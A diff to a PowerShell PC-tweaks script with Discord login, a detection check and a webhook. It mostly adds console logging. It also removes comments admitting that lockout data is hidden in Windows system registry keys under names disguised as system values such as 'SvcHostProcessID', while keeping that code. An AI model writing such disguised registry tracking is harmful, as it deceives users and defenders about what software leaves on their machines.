@@ -59,30 +59,24 @@ if (Test-Path $logPath) {
     try { New-Item -Path $logPath -ItemType File -Force | Out-Null } catch {}
 }
 
-# Helper function to get obfuscated registry paths
 function Get-ObfuscatedRegistryPath {
     param([string]$Purpose = 'lockout')
     
-    # Generate a deterministic but obfuscated key name based on machine-specific data
     $seed = "$env:COMPUTERNAME-$env:PROCESSOR_IDENTIFIER".GetHashCode().ToString('X8')
     
-    # Hide deep in Windows system registry with legitimate-looking names
     $basePaths = @(
         "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\Settings"
         "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions"
         "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"
     )
-    
-    # Select path based on seed
+
     $selectedIndex = [Math]::Abs($seed.GetHashCode()) % $basePaths.Count
     $basePath = $basePaths[$selectedIndex]
     
-    # Generate obfuscated subkey name that looks like a GUID
     $subKey = "{{0x{0:X8}-{1:X4}-{2:X4}}" -f $seed.GetHashCode(), (Get-Date).Year, (Get-Date).Month
     
     $fullPath = Join-Path $basePath $subKey
-    
-    # Obfuscated value names that look like system entries
+
     $valueNames = @{
         'lockout' = 'SvcHostProcessID'
         'userId' = 'LastUserSessionGUID'
@@ -99,7 +93,6 @@ if (-not $global:RatzLog) { $global:RatzLog = @() }
 if (-not $global:ErrorsDetected) { $global:ErrorsDetected = $false }
 if (-not (Get-Variable -Name 'DiscordAuthError' -Scope Global -ErrorAction SilentlyContinue)) { $global:DiscordAuthError = $null }
 if (-not (Get-Variable -Name 'DetectionTriggered' -Scope Global -ErrorAction SilentlyContinue)) { $global:DetectionTriggered = $false }
-# Store script root globally so it's accessible from webhook function
 $global:RatzScriptRoot = $PSScriptRoot
 
 # Lightweight global logger used throughout the script
@@ -2445,15 +2438,19 @@ setTimeout(checkStatus, 2000);
         # On /main-tweaks, auto-run all main/gpu tweaks (no checkboxes)
         # Accept both GET (from redirect) and POST (from form submission)
         if ($path -eq '/main-tweaks' -and ($method -eq 'POST' -or $method -eq 'GET')) {
+            [Console]::WriteLine("========================================")
             [Console]::WriteLine("Route:/main-tweaks ($method) - processing tweaks request")
-            [Console]::WriteLine("Route:/main-tweaks: DiscordAuthenticated = $global:DiscordAuthenticated")
-            [Console]::WriteLine("Route:/main-tweaks: DiscordUserId = $global:DiscordUserId")
-            [Console]::WriteLine("Route:/main-tweaks: DiscordUserName = $global:DiscordUserName")
+            [Console]::WriteLine("Route:/main-tweaks: DiscordAuthenticated = [$global:DiscordAuthenticated]")
+            [Console]::WriteLine("Route:/main-tweaks: DiscordUserId = [$global:DiscordUserId]")
+            [Console]::WriteLine("Route:/main-tweaks: DiscordUserName = [$global:DiscordUserName]")
+            [Console]::WriteLine("Route:/main-tweaks: DiscordAvatarUrl = [$global:DiscordAvatarUrl]")
+            [Console]::WriteLine("Route:/main-tweaks: DetectionTriggered = [$global:DetectionTriggered]")
             
             # Check if user has Discord info (came from OAuth flow) or if already authenticated
             # If user has Discord ID, they must have authenticated even if flag isn't set
             if (-not $global:DiscordAuthenticated -and -not $global:DiscordUserId) {
-                [Console]::WriteLine("Route:/main-tweaks ($method) blocked: Discord not authenticated and no user ID")
+                [Console]::WriteLine("Route:/main-tweaks ($method) BLOCKED: Discord not authenticated and no user ID")
+                [Console]::WriteLine("========================================")
                 $html = & $getStatusHtml 'main-tweaks' $null $null $null
                 & $send $ctx 200 'text/html' $html
                 continue
@@ -2461,9 +2458,12 @@ setTimeout(checkStatus, 2000);
             
             # If we have user ID but flag isn't set, set it now
             if ($global:DiscordUserId -and -not $global:DiscordAuthenticated) {
-                [Console]::WriteLine("Route:/main-tweaks: Setting DiscordAuthenticated to true (user ID exists)")
+                [Console]::WriteLine("Route:/main-tweaks: ✓ Setting DiscordAuthenticated to true (user ID exists)")
                 $global:DiscordAuthenticated = $true
             }
+            
+            [Console]::WriteLine("Route:/main-tweaks: ✓ Authentication check passed! Proceeding with tweaks...")
+            [Console]::WriteLine("========================================")
             
             # Check if detection was triggered
             if ($global:DetectionTriggered) {
@@ -2575,13 +2575,21 @@ setTimeout(checkStatus, 2000);
             }
             
             # This part is reached only if no detection occurred - send "clean user" webhook
-            [Console]::WriteLine('Route:/main-tweaks: NO DETECTION - sending clean user webhook...')
+            [Console]::WriteLine('========================================')
+            [Console]::WriteLine('Route:/main-tweaks: ✓ NO DETECTION - User is CLEAN!')
+            [Console]::WriteLine("Route:/main-tweaks: Sending clean user webhook...")
+            [Console]::WriteLine("Route:/main-tweaks: UserId = [$global:DiscordUserId]")
+            [Console]::WriteLine("Route:/main-tweaks: UserName = [$global:DiscordUserName]")
+            [Console]::WriteLine("Route:/main-tweaks: AvatarUrl = [$global:DiscordAvatarUrl]")
             try { 
                 Send-DiscordWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl
-                [Console]::WriteLine('Route:/main-tweaks: clean user webhook sent successfully')
+                [Console]::WriteLine('Route:/main-tweaks: ✓✓✓ Clean user webhook sent successfully!')
             } catch { 
-                [Console]::WriteLine("Route:/main-tweaks: clean user webhook failed: $($_.Exception.Message)")
+                [Console]::WriteLine("Route:/main-tweaks: ✗✗✗ Clean user webhook FAILED: $($_.Exception.Message)")
+                [Console]::WriteLine("Route:/main-tweaks: Exception type: $($_.Exception.GetType().FullName)")
             }
+            [Console]::WriteLine('========================================')
+            [Console]::WriteLine('')
             $form = & $parseForm $ctx
             if ($form -isnot [System.Collections.Specialized.NameValueCollection]) { $form = $null }
             $optIn = $false
